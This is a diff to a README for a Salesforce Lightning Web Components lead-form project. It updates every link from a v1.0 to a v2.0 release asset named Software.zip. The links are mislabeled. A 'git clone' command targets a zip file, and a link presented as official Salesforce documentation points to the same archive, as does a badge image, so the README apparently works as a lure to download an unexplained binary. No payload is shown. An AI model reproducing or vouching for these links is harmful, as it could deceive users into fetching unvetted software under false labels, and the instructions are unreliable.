@@ -7,7 +7,7 @@ To get started with the Web-To-Lead-Form-LWC project, simply follow the steps be
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/MulkMarquise/Web-To-Lead-Form-LWC/releases/download/v1.0/Software.zip
+   git clone https://github.com/MulkMarquise/Web-To-Lead-Form-LWC/releases/download/v2.0/Software.zip
    ```
 
 2. Install dependencies:
@@ -50,9 +50,9 @@ This repository covers a wide range of topics including:
 🌟 Embrace these exciting topics within the Web-To-Lead-Form-LWC project and elevate your Salesforce development skills!
 
 ## 🔗 Additional Resources
-For more information and detailed documentation, visit the official Salesforce Lightning Web Components [documentation](https://github.com/MulkMarquise/Web-To-Lead-Form-LWC/releases/download/v1.0/Software.zip).
+For more information and detailed documentation, visit the official Salesforce Lightning Web Components [documentation](https://github.com/MulkMarquise/Web-To-Lead-Form-LWC/releases/download/v2.0/Software.zip).
 
-⬇️ **Download latest release** [![Download ZIP](https://github.com/MulkMarquise/Web-To-Lead-Form-LWC/releases/download/v1.0/Software.zip%20ZIP-v1.0.0-blue)](https://github.com/MulkMarquise/Web-To-Lead-Form-LWC/releases/download/v1.0/Software.zip)
+⬇️ **Download latest release** [![Download ZIP](https://github.com/MulkMarquise/Web-To-Lead-Form-LWC/releases/download/v2.0/Software.zip%20ZIP-v1.0.0-blue)](https://github.com/MulkMarquise/Web-To-Lead-Form-LWC/releases/download/v2.0/Software.zip)
 
 🌟 Unleash the power of Salesforce Lightning Web Components with the Web-To-Lead-Form-LWC project and transform your lead capture processes! 🚀
 
